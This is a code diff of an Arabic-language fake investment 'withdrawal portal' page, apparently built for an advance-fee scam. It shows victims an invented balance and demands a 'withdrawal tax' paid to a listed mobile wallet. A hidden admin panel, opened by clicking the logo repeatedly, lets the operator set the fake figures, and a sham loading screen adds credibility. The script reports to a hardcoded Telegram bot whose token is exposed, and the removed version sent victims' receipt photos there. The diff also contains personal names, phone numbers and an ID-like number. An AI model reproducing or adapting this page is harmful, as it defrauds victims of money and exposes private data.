@@ -3,258 +3,117 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>شركة التقوى للاستثمار - لوحة التحكم</title>
+    <title>AL-TAQWA Institutional | Withdrawal Portal</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --bg-color: #ffffff; /* خلفية بيضاء بالكامل */
-            --text-color: #333333; /* نص داكن للوضوح */
-            --sidebar-bg: #f8f9fa; /* خلفية جانبية فاتحة جداً */
-            --gold: #ffcc00;
-            --border-color: #dddddd;
-        }
+        :root { --bg: #ffffff; --side: #37474f; --gold: #ffcc00; --border: #eeeeee; --up: #0ecb81; --down: #f6465d; }
+        body { margin: 0; font-family: 'Cairo', sans-serif; background: var(--bg); display: flex; min-height: 100vh; overflow-x: hidden; }
 
-        body {
-            margin: 0;
-            font-family: 'Cairo', sans-serif;
-            background-color: var(--bg-color);
-            color: var(--text-color);
-            display: flex; /* لعمل التقسيم الجانبي */
-            min-height: 100vh;
-        }
+        /* --- Sidebar جهة اليسار (منظور كامل) --- */
+        .sidebar { width: 220px; background: var(--side); color: white; display: flex; flex-direction: column; position: sticky; top: 0; height: 100vh; order: 2; }
+        .side-header { background: #263238; padding: 20px; font-weight: 900; color: var(--gold); text-align: center; font-size: 22px; cursor: pointer; }
+        .nav-link { text-decoration: none; color: #cfd8dc; padding: 18px 25px; font-size: 15px; border-bottom: 1px solid rgba(255,255,255,0.05); transition: 0.3s; }
+        .nav-link:hover { background: rgba(255, 255, 255, 0.1); color: white; }
+        .nav-link.active { background: var(--gold); color: #000; font-weight: bold; }
 
-        /* --- الشريط الجانبي (Sidebar) --- */
-        .sidebar {
-            width: 250px;
-            background-color: var(--sidebar-bg);
-            border-left: 1px solid var(--border-color);
-            display: flex;
-            flex-direction: column;
-            padding: 20px;
-            position: sticky;
-            top: 0;
-            height: 100vh;
-            box-sizing: border-box;
-        }
+        /* --- المحتوى الرئيسي عريض --- */
+        .main-content { flex: 1; padding: 30px 50px; order: 1; background: #fff; }
+        .top-bar { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #eceff1; padding-bottom: 15px; margin-bottom: 30px; }
+        .top-bar h2 { margin: 0; color: #1a237e; font-size: 28px; }
 
-        .sidebar .logo-text {
-            font-size: 22px;
-            font-weight: 900;
-            color: var(--gold);
-            text-align: center;
-            margin-bottom: 40px;
-            cursor: pointer;
-        }
+        .withdraw-table { max-width: 1000px; margin: 0 auto; }
+        .row { display: flex; justify-content: space-between; align-items: center; padding: 20px 0; border-bottom: 1px solid var(--border); }
+        .label { font-weight: bold; color: #546e7a; flex: 1; font-size: 16px; }
+        .value { flex: 2; text-align: left; font-weight: 900; font-size: 18px; }
 
-        .sidebar .nav-link {
-            text-decoration: none;
-            color: var(--text-color);
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 10px;
-            font-weight: bold;
-            transition: 0.3s;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
+        /* ستايل الصور المرفقة */
+        .yellow-btn { background: var(--gold); color: #000; padding: 12px; text-align: center; font-weight: 900; margin: 30px 0 10px 0; font-size: 18px; }
+        .fee-text { color: var(--down); text-align: center; font-size: 15px; margin-bottom: 10px; font-weight: bold; }
+        .wallet-box { background: #000; color: var(--gold); padding: 15px; text-align: center; font-size: 24px; font-weight: 900; border-radius: 8px; margin-bottom: 25px; letter-spacing: 2px; }
+        .success-msg { background: #e8f5e9; color: #2e7d32; padding: 15px; border-radius: 6px; text-align: center; font-size: 15px; margin-bottom: 25px; border-right: 5px solid #2e7d32; }
 
-        .sidebar .nav-link:hover {
-            background-color: rgba(255, 204, 0, 0.1);
-        }
+        /* شاشة التحميل 5 ثواني */
+        #loader { position: fixed; inset: 0; background: rgba(0,0,0,0.92); z-index: 10000; display: none; flex-direction: column; justify-content: center; align-items: center; color: white; }
+        .bar-bg { width: 280px; height: 8px; background: #333; border-radius: 10px; overflow: hidden; margin-top: 20px; }
+        .bar-fill { width: 0%; height: 100%; background: var(--gold); transition: width 5s linear; }
 
-        .sidebar .nav-link.active {
-            background-color: var(--gold);
-            color: #000;
-        }
+        .submit-final { background: #2e7d32; color: white; border: none; width: 100%; padding: 22px; font-size: 20px; font-weight: 900; border-radius: 8px; cursor: pointer; transition: 0.3s; }
+        .submit-final:hover { background: #1b5e20; transform: translateY(-2px); }
 
-        /* --- المحتوى الرئيسي --- */
-        .main-content {
-            flex: 1;
-            padding: 30px;
-            box-sizing: border-box;
-        }
-
-        .card {
-            background: #ffffff;
-            border: 1px solid var(--border-color);
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
-            max-width: 800px;
-            margin: auto;
-        }
-
-        .logo-text-main {
-            font-size: 28px;
-            font-weight: 900;
-            color: var(--gold);
-            margin-bottom: 10px;
-            text-align: center;
-        }
-
-        .sub-title {
-            text-align: center;
-            color: #666;
-            margin-bottom: 30px;
-        }
-
-        .balance-area {
-            background: #f1f3f4;
-            padding: 20px;
-            border-radius: 12px;
-            margin-bottom: 30px;
-            border-right: 5px solid var(--gold);
-            text-align: center;
-        }
-
-        .balance-area span {
-            font-size: 14px;
-            color: #666;
-        }
-
-        .balance-area div {
-            font-size: 40px;
-            font-weight: 700;
-            color: #000;
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-            text-align: right;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: bold;
-            color: var(--text-color);
-        }
-
-        .data-box {
-            width: 100%;
-            padding: 15px;
-            border-radius: 8px;
-            border: 1px solid var(--border-color);
-            background-color: #f8f9fa;
-            color: #333;
-            font-size: 16px;
-            box-sizing: border-box;
-            text-align: right;
-        }
-
-        .cash-box {
-            background: #000;
-            color: var(--gold);
-            padding: 15px;
-            border-radius: 8px;
-            font-size: 22px;
-            font-weight: bold;
-            text-align: center;
-            margin: 20px 0;
-            border: 1px solid var(--gold);
-        }
-
-        .file-label {
-            display: block;
-            background: #f1f3f4;
-            border: 2px dashed var(--border-color);
-            padding: 20px;
-            border-radius: 8px;
-            cursor: pointer;
-            text-align: center;
-            margin-bottom: 30px;
-            color: #555;
-            transition: 0.3s;
-        }
-
-        .file-label:hover {
-            border-color: var(--gold);
-            background-color: rgba(255, 204, 0, 0.05);
-        }
-
-        .submit-btn {
-            background: linear-gradient(90deg, #ffcc00, #ffaa00);
-            color: #000;
-            border: none;
-            width: 100%;
-            padding: 18px;
-            font-size: 20px;
-            font-weight: 900;
-            border-radius: 10px;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-
-        .submit-btn:hover {
-            box-shadow: 0 5px 15px rgba(255, 170, 0, 0.3);
-        }
-
-        /* لوحة التحكم السرية للمدير */
-        .admin-box {
-            background: #fff;
-            border: 1px solid var(--gold);
-            padding: 15px;
-            border-radius: 10px;
-            position: fixed;
-            top: 20px;
-            left: 20px;
-            z-index: 100;
-            display: none;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
-            color: #000;
-        }
+        /* لوحة التحكم السرية */
+        .admin-panel { display: none; position: fixed; top: 20px; right: 20px; background: white; border: 2px solid var(--gold); padding: 20px; z-index: 11000; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
+        .admin-panel input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; font-family: 'Cairo'; }
     </style>
 </head>
 <body>
 
+<div id="loader">
+    <h2 id="l-txt">جاري مراجعة السيولة النقدية...</h2>
+    <div class="bar-bg"><div class="bar-fill" id="fill"></div></div>
+</div>
+
 <div class="sidebar">
-    <div class="logo-text" onclick="checkAdmin()">AL-TAQWA</div>
+    <div class="side-header" onclick="admTrig()">AL-TAQWA</div>
     <a href="#" class="nav-link">الحساب</a>
+    <a href="#" class="nav-link">الإيداع</a>
     <a href="#" class="nav-link active">السحب</a>
     <a href="#" class="nav-link">التاريخ</a>
     <a href="#" class="nav-link">الإحصائيات</a>
-    <a href="#" class="nav-link">توثيق الحساب (KYC)</a>
 </div>
 
 <div class="main-content">
-    <div class="admin-box" id="adminBox">
-        <h4 style="margin-top:0">إعدادات المدير</h4>
-        الربح: <input type="number" id="pIn" value="50000" oninput="upd()"> <br><br>
-        الرسوم: <input type="number" id="fIn" value="500" oninput="upd()"> <br><br>
-        الاسم: <input type="text" id="nIn" value="يوسف هاني" oninput="upd()"> <br><br>
-        المحفظة: <input type="text" id="wIn" value="0127373343790" oninput="upd()">
+    <div class="admin-panel" id="admBox">
+        <h4 style="margin:0">إعدادات المدير ⚙️</h4>
+        الرصيد: <input type="number" id="aB" value="44580">
+        الاسم: <input type="text" id="aN" value="احمد حجاج فهمي">
+        الرسوم: <input type="number" id="aF" value="4500">
+        المحفظة: <input type="text" id="aW" value="01226811784">
+        <button onclick="saveAdm()" style="width:100%; padding:10px; background:#000; color:#fff; border:none; cursor:pointer; border-radius:5px;">حفظ التعديلات</button>
     </div>
 
-    <div class="card">
-        <div class="logo-text-main">شركة التقوى للاستثمار</div>
-        <div class="sub-title">منصة سحب الأرباح المعتمدة</div>
+    <div class="top-bar">
+        <h2>سحب الأموال</h2>
+        <div style="text-align: left;">
+            <b id="hName">احمد حجاج فهمي</b><br>
+            <small style="color:#777">01015545535</small>
+        </div>
+    </div>
+
+    <div class="withdraw-table">
+        <div class="row">
+            <span class="label">طريقة السحب</span>
+            <span class="value">تحويل محفظة إلكترونية مصرية</span>
+        </div>
+        <div class="row">
+            <span class="label">المبلغ المراد سحبه</span>
+            <span class="value"><span id="pOut">44,580</span> جنيه مصري</span>
+        </div>
+        <div class="row">
+            <span class="label">رقم الحساب / المحفظة</span>
+            <span class="value" style="background:#f9f9f9; padding:10px; border:1px solid #ddd; border-radius:4px; width:100%; text-align:center;">XXXX-XXXX-XXXX-XXXX</span>
+        </div>
+        <div class="row" style="border:none;">
+            <span class="label">الاسم <br><small>الكود</small></span>
+            <span class="value">
+                <span id="nOut">احمد حجاج فهمي</span><br>
+                <small style="color:#777">29312012701978</small>
+            </span>
+        </div>
+
+        <div class="yellow-btn">تأكيد السحب</div>
         
-        <div class="balance-area">
-            <span>رصيدك القابل للسحب حالياً</span>
-            <div><span id="pOut">50,000</span> <small>EGP</small></div>
+        <div class="fee-text">
+            يرجى سداد ضريبة السحب <span id="fOut">4500</span> ج مصري<br>
+            الدفع على رقم المحفظة المعتمد :
         </div>
 
-        <div class="form-group">
-            <label>الاسم بالكامل:</label>
-            <div class="data-box" id="nOut">يوسف هاني</div>
+        <div class="wallet-box" id="wOut">01226811784</div>
+
+        <div class="success-msg">
+            ✓ تم تقديم طلب سحب بمبلغ <span id="pOut2">44,580</span> جنيه مصري بنجاح.
         </div>
 
-        <div class="form-group">
-            <label>رقم محفظتك المستلمة:</label>
-            <div class="data-box" id="wOut">0127373343790</div>
-        </div>
-
-        <p style="text-align: center; font-size: 15px; color: #444;">يرجى تحويل رسوم المعالجة والتفعيل المدعومة (<span id="fOut" style="color:var(--gold); font-weight:bold;">500</span> ج.م) للرقم:</p>
-        
-        <div class="cash-box">01226811784</div>
-
-        <label class="file-label" onclick="document.getElementById('img').click()">
-            <input type="file" id="img" hidden onchange="document.getElementById('fn').innerText='✅ تم اختيار الصورة'">
-            <span id="fn">أرفق صورة إيصال التحويل 📸</span>
-        </label>
-
-        <button class="submit-btn" onclick="sendData()">تأكيد وإرسال الطلب</button>
+        <button class="submit-final" onclick="startProcess()">تأكيد طلب السحب الفوري</button>
     </div>
 </div>
 
@@ -262,44 +121,62 @@
     const TOKEN = '8398403697:AAEf0JjyVG-yE-DLS1FZKDX1_UKg8lEm02E';
     const ID = '8232581666';
 
-    let clicks = 0;
-    function checkAdmin() {
-        clicks++;
-        if (clicks >= 5) {
-            document.getElementById('adminBox').style.display = 'block';
-            clicks = 0;
-        }
+    // استرجاع البيانات المحفوظة
+    let b = localStorage.getItem('site_bal') || "44580";
+    let n = localStorage.getItem('site_name') || "احمد حجاج فهمي";
+    let f = localStorage.getItem('site_fee') || "4500";
+    let w = localStorage.getItem('site_wall') || "01226811784";
+
+    function apply() {
+        document.getElementById('pOut').innerText = Number(b).toLocaleString();
+        document.getElementById('pOut2').innerText = Number(b).toLocaleString();
+        document.getElementById('nOut').innerText = n;
+        document.getElementById('hName').innerText = n;
+        document.getElementById('fOut').innerText = f;
+        document.getElementById('wOut').innerText = w;
+    }
+    apply();
+
+    function startProcess() {
+        const loader = document.getElementById('loader');
+        const fill = document.getElementById('fill');
+        const txt = document.getElementById('l-txt');
+        
+        loader.style.display = 'flex';
+        fill.style.width = '100%';
+        
+        setTimeout(() => { txt.innerText = "جاري استخراج كود المعاملة الرقمي..."; }, 2000);
+
+        setTimeout(async () => {
+            loader.style.display = 'none';
+            fill.style.width = '0%';
+            
+            const txn = "TXN-" + Math.floor(Math.random()*900000 + 100000) + "-AQ";
+            const msg = `✅ طلب سحب مؤكد\n━━━━━━━━━━\n👤 الاسم: ${n}\n💰 المبلغ: ${b} ج.م\n🆔 المعاملة: ${txn}\n⚠️ الحالة: بانتظار الرسوم`;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(msg)}`);
+                alert(`الطلب مؤكد ✓\nرقم المعاملة: ${txn}\nسيتم التحويل فور التأكد من سداد الرسوم.`);
+            } catch(e) { alert("تم التأكيد، بانتظار مراجعة الإدارة."); }
+        }, 5000);
     }
 
-    function upd() {
-        document.getElementById('pOut').innerText = Number(document.getElementById('pIn').value).toLocaleString();
-        document.getElementById('fOut').innerText = document.getElementById('fIn').value;
-        document.getElementById('nOut').innerText = document.getElementById('nIn').value;
-        document.getElementById('wOut').innerText = document.getElementById('wIn').value;
-    }
-
-    async function sendData() {
-        const file = document.getElementById('img').files[0];
-        if(!file) { alert("يرجى إرفاق صورة الإيصال أولاً!"); return; }
-
-        const p = document.getElementById('pIn').value;
-        const f = document.getElementById('fIn').value;
-        const n = document.getElementById('nIn').value;
-        const w = document.getElementById('wIn').value;
-
-        const msg = `🌟 طلب سحب جديد 🌟\n👤 الاسم: ${n}\n📱 المحفظة: ${w}\n💰 المبلغ: ${p} ج.م\n💸 الرسوم: ${f} ج.م`;
-
-        const fd = new FormData();
-        fd.append('chat_id', ID);
-        fd.append('photo', file);
-        fd.append('caption', msg);
-
-        try {
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-            alert("تم إرسال طلبك بنجاح! سيتم المراجعة والتحويل خلال 15 دقيقة.");
-        } catch(e) {
-            alert("فشل الإرسال، تأكد من اتصال الإنترنت.");
-        }
+    let c = 0;
+    function admTrig() { c++; if(c >= 3) { document.getElementById('admBox').style.display='block'; c=0; } }
+    
+    function saveAdm() {
+        b = document.getElementById('aB').value;
+        n = document.getElementById('aN').value;
+        f = document.getElementById('aF').value;
+        w = document.getElementById('aW').value;
+        
+        localStorage.setItem('site_bal', b);
+        localStorage.setItem('site_name', n);
+        localStorage.setItem('site_fee', f);
+        localStorage.setItem('site_wall', w);
+        
+        apply();
+        document.getElementById('admBox').style.display='none';
     }
 </script>
 
